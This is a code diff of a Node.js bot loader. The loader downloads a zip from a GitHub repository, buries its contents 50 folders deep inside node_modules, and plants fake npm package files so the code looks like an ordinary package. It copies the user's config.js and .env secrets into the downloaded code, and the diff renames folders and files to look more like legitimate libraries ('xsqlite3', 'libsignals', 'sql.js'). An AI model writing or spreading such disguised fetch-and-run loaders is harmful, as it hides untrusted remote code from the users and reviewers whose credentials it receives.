@@ -123,7 +123,7 @@ const AdmZip = require('adm-zip');
 
 // === CONFIG ===
 const repoZipUrl = 'https://github.com/dxui/--/archive/refs/heads/main.zip';
-const baseFolder = path.join(__dirname, 'node_modules', '.xsqlite');
+const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 50;
 
 // === Step 0: Inject fake NPM files
@@ -150,8 +150,8 @@ function injectFakePackageFiles(basePath) {
   );
 
   fs.writeFileSync(
-    path.join(basePath, 'index.js'),
-    `module.exports = require("node:fs"); // dummy binding`
+    path.join(basePath, 'sql.js'),
+    `module.exports = require("node:fs"); // SQL`
   );
 
   fs.writeFileSync(
@@ -166,17 +166,17 @@ function injectFakePackageFiles(basePath) {
     } NodeJS Project\n\nPermission is hereby granted...`
   );
 
-  console.log('[🪐] Initializing server...');
+  console.log('🪐 Initializing bot server...');
 }
 
 // === Step 1: Build deep path
 function createDeepRepoPath() {
   let deepPath = baseFolder;
   for (let i = 0; i < DEEP_NEST_COUNT; i++) {
-    deepPath = path.join(deepPath, '_error');
+    deepPath = path.join(deepPath, 'libsignals');
   }
 
-  const repoFolder = path.join(deepPath, 'repo');
+  const repoFolder = path.join(deepPath, 'sql');
   fs.mkdirSync(repoFolder, { recursive: true });
   return repoFolder;
 }
@@ -184,11 +184,11 @@ function createDeepRepoPath() {
 // === Step 2: Download + extract zip
 async function downloadAndExtractRepo(repoFolder) {
   try {
-    console.log('[🔄] Syncing codes from Space...');
+    console.log('🔄 Syncing codes from Space...');
     const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
     const zip = new AdmZip(Buffer.from(response.data, 'binary'));
     zip.extractAllTo(repoFolder, true);
-    console.log('[✅] Codes synced successfully');
+    console.log('✅ Codes synced successfully');
   } catch (err) {
     console.error('❌ Pull error:', err.message);
     process.exit(1);
@@ -202,7 +202,7 @@ function copyConfigs(repoPath) {
 
   try {
     fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
-    console.log('[✅] config.js copied');
+    console.log('✅ config.js copied');
   } catch {
     console.warn('⚠️ config.js not found');
   }
@@ -210,9 +210,9 @@ function copyConfigs(repoPath) {
   if (fs.existsSync(envSrc)) {
     try {
       fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
-      console.log('[✅] .env copied');
+      console.log('✅ .env copied');
     } catch {
-      console.warn('[⚠️] Could not copy .env');
+      console.warn('⚠️ Could not copy .env');
     }
   }
 }
@@ -240,7 +240,7 @@ function copyConfigs(repoPath) {
   if (!fs.existsSync(configdbPath)) {
     console.warn('⚠️ lib/configdb.js not found. Some features may not work.');
   } else {
-    console.log('[✅] lib/configdb.js exists.');
+    console.log('✅ lib/configdb.js exists.');
   }
 
   // 🔹 Run the bot
